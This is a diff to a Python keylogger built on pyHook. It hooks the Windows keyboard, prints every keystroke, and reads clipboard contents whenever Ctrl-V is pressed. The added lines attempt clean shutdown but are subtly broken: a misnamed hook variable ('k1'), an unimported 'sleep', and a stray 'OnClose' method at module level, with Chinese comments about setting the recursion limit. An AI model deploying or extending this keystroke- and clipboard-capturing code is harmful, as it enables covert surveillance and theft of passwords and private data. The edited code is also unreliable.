@@ -1,3 +1,4 @@
+# -*- coding:utf-8 -*-
 from ctypes import *
 import pythoncom
 import pyHook
@@ -51,6 +52,7 @@ def KeyStroke(event):
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
         print chr(event.Ascii),
+
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -60,18 +62,34 @@ def KeyStroke(event):
             win32clipboard.CloseClipboard()
             print "[PASTE] - %s" % (pasted_value),
         else:
-            print "[%s]" % event.Key,
+            print "[%s]" % event.Key
+            sleep(10)
 
     # pass execution to next hook registered
     return True
 
-def run(** args):
+
     # create and register a hook manager
+
+def run():
+
     kl = pyHook.HookManager()
     kl.KeyDown = KeyStroke
 
     # register the hook and execute forever
     kl.HookKeyboard()
     pythoncom.PumpMessages()
-    return 0
+    k1.unhookKeyboard()
+    win32api.PostQuitMessage(0)  # 退出监控消息 很关键 必须配合sys.setrecursionlimit(4000)使用效果##才明显 不然的话 程序无法退出。
 
+
+# raise exceptions.SystemExit
+
+
+
+
+import sys
+def OnClose(self, event):
+	sys.setrecursionlimit(4000)  # 相当关键
+	self.Close(True)
+	self.Destroy()
